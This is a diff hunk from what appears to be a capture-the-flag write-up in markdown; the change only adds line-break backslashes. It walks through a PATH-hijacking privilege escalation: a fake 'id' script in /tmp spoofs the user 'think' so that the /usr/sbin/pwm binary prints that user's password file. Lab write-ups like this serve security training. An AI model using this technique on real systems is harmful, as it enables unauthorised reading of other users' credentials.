@@ -48,10 +48,10 @@ I ran linpeas on the system and linpeas flagged an unusual binary present called
 When I ran the binary, it execute id to get the user and then tries
 to print the password file present in the user if it is found. What can be done now is to fake the 'id' by creating our own version of id by doing
 
-`echo '#!/bin/bash' > /tmp/id` create file starting with #!/bin/bash
-`echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id` append the format that id returns in the next line to spoof user
-`chmod +x /tmp/id` set file as executable
-`export PATH=/tmp:$PATH` export path to this current directory (I used tmp dir) so id will refer to the id we created
+`echo '#!/bin/bash' > /tmp/id` create file starting with #!/bin/bash\
+`echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id` append the format that id returns in the next line to spoof user\
+`chmod +x /tmp/id` set file as executable\
+`export PATH=/tmp:$PATH` export path to this current directory (I used tmp dir) so id will refer to the id we created\
 `/usr/sbin/pwm` execute the pwm binary
 
 ![screenshot](images/pwmexploit.png)
